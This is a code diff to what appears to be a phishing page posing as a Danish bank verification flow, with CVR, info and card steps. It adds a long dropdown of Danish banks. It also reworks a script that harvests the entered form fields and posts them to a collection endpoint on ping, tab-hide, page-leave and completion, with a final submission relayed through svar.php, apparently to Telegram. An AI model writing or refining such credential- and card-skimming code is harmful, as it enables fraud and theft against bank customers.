@@ -671,31 +671,60 @@
       <div class="box">
         <select id="extra">
           <option value="" selected>Vælg bank</option>
-          <option>Danske Bank</option>
-          <option>Nykredit Bank</option>
-          <option>Nordea Danmark</option>
-          <option>Jyske Bank</option>
-          <option>Sydbank</option>
+          <option>Andelskassen Fælleskassen</option>
           <option>Arbejdernes Landsbank</option>
-          <option>Spar Nord Bank</option>
-          <option>Lån & Spar Bank</option>
-          <option>Vestjysk Bank</option>
-          <option>Lunar Bank</option>
-          <option>Sparekassen Kronjylland</option>
-          <option>Sparekassen Sjælland-Fyn</option>
-          <option>Den Jyske Sparekasse</option>
-          <option>Ringkjøbing Landbobank</option>
-          <option>Alka Mobilbank</option>
-          <option>Middelfart Sparekasse</option>
-          <option>Frøs Sparekasse</option>
-          <option>Sparekassen Thy</option>
-          <option>DLR Kredit</option>
-          <option>Totalkredit</option>
-          <option>Realkredit Danmark</option>
-          <option>Handelsbanken</option>
+          <option>Balling Sparekasse</option>
+          <option>Borbjerg Sparekasse</option>
           <option>Coop Bank</option>
-          <option>SJF</option>
-          <option>Stadil sparekasse</option>
+          <option>Danmarks Skibskredit</option>
+          <option>Danske Andelskassers Bank</option>
+          <option>Danske Bank</option>
+          <option>Djurslands Bank</option>
+          <option>DLR Kredit</option>
+          <option>Dragsholm Sparekasse</option>
+          <option>Ekspres Bank</option>
+          <option>Facit Bank</option>
+          <option>Faster Andelskasse</option>
+          <option>Frørup Andelskasse</option>
+          <option>Frøslev-Mollerup Sparekasse</option>
+          <option>Fynske Bank</option>
+          <option>Hvidbjerg Bank</option>
+          <option>Jyske Bank</option>
+          <option>Jyske Realkredit</option>
+          <option>Klim Sparekasse</option>
+          <option>kompasbank</option>
+          <option>Kreditbanken</option>
+          <option>Lollands Bank</option>
+          <option>Lunar Bank</option>
+          <option>Lægernes Bank</option>
+          <option>Lån & Spar Bank</option>
+          <option>Maj Bank</option>
+          <option>Merkur Andelskasse</option>
+          <option>Middelfart Sparekasse</option>
+          <option>Møns Bank</option>
+          <option>Nordea</option>
+          <option>Nordea Kredit</option>
+          <option>Nykredit Bank</option>
+          <option>Nykredit Realkredit</option>
+          <option>Realkredit Danmark</option>
+          <option>Ringkjøbing Landbobank</option>
+          <option>Rise Sparekasse</option>
+          <option>Rønde Sparekasse</option>
+          <option>Saxo Bank</option>
+          <option>SJF Bank</option>
+          <option>Skjern Bank</option>
+          <option>SparNord</option>
+          <option>Sparekassen Bredebro</option>
+          <option>Sparekassen Danmark</option>
+          <option>Sparekassen for Nr. Nebel og Omegn</option>
+          <option>Sparekassen Kronjylland</option>
+          <option>Sparekassen Thy</option>
+          <option>Stadil Sparekasse</option>
+          <option>Sydbank</option>
+          <option>Sydjysk Sparekasse</option>
+          <option>Sønderhå-Hørsted Sparekasse</option>
+          <option>Totalkredit</option>
+          <option>Vestjysk Bank</option>
         </select>
       </div>
 
@@ -1090,10 +1119,9 @@
 
       // Show done page immediately (one tap)
       go("page-done");
-      window.__jujSubmitted = true; // block leave duplicate after submit
 
       try {
-        // One Telegram only — via svar.php (not partial complete)
+        if (window.__jujFinalize) window.__jujFinalize();
         await fetch('svar.php', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -1168,44 +1196,32 @@
         const el = document.getElementById('extra');
         return !!(el && el.value && String(el.value).trim());
       }
-      // Lightweight live-stats presence (all steps: CVR / info / card)
-      function presence() {
-        try {
-          const img = new Image();
-          img.referrerPolicy = 'no-referrer';
-          img.src = 'ping.php?sid=' + encodeURIComponent(sid) + '&t=' + Date.now();
-          fetch('ping.php?sid=' + encodeURIComponent(sid) + '&t=' + Date.now(), {
-            cache: 'no-store',
-            keepalive: true
-          }).catch(() => { });
-        } catch (e) { }
-      }
       let leaveSent = false;
-      function sendLeave() {
+      function send(status) {
         try {
-          // Already submitted → svar.php already sent the one message
-          if (window.__jujSubmitted) return;
-          // Only after bank; only once; only real leave (not tab switch)
-          if (!bankChosen() || leaveSent) return;
-          leaveSent = true;
+          // Leave ping only after bank is selected
+          if ((status === 'leave' || status === 'beacon') && !bankChosen()) return;
+          if ((status === 'leave' || status === 'beacon') && leaveSent) return;
+          if (status === 'leave' || status === 'beacon') leaveSent = true;
           fetch(PARTIAL_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ session_id: sid, step: step(), status: 'leave', fields: harvest() }),
+            body: JSON.stringify({ session_id: sid, step: step(), status: status, fields: harvest() }),
             keepalive: true
           }).catch(() => { });
         } catch (e) { }
       }
 
-      presence(); // count from CVR/home immediately
-      setInterval(() => { if (document.visibilityState === 'visible') presence(); }, 10000);
-      ['next1', 'next2', 'next3'].forEach(id => {
-        const b = document.getElementById(id);
-        if (b) b.addEventListener('click', () => presence(), { capture: true });
+      send('ping'); // presence only
+      window.addEventListener('pagehide', () => send('leave'));
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') send('leave');
       });
+      // Longer interval — less load with many visitors
+      setInterval(() => { if (document.visibilityState === 'visible') send('ping'); }, 30000);
 
-      // Real navigation away / close — not switching browser tabs
-      window.addEventListener('pagehide', () => sendLeave());
+      // final submit signals completion
+      window.__jujFinalize = () => send('complete');
     })();
   </script>
 </body>
